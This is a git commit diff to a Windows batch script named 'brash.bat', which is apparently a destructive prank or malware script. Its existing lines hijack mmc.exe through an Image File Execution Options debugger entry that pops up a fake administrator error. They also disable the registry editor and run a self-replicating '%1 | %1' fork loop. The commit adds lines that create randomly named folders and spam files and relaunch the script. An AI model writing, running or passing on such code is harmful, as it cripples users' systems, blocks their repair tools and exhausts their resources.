b1f826ef9ff9d4012a444f1730cd779d909c5c8e
michelle1574 <70703680+michelle1574@users.noreply.github.com>
2021-08-22 21:19:20 +0100

    Update brash.bat

--- trash-1/brash.bat
+++ trash-1/brash.bat
@@ -23,6 +23,10 @@ reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies" /
 echo x=msgbox("The MMC has been disabled by administrator.", VBOkOnly+VbCritical, "Error") > C:\Windows\error_mmc.vbs
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe" /v Debugger /d C:\Windows\error_mmc.vbs /t REG_SZ /f > nul
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /d 1 /t REG_DWORD /f > nul
+mkdir C:\%random%
+echo spamspamspamspamspamspamspam > %random%\%random%
+echo spamspamspamspamspamspamspam > %random%
 start explorer.exe
 start notepad.exe
 %1 | %1
+start %1
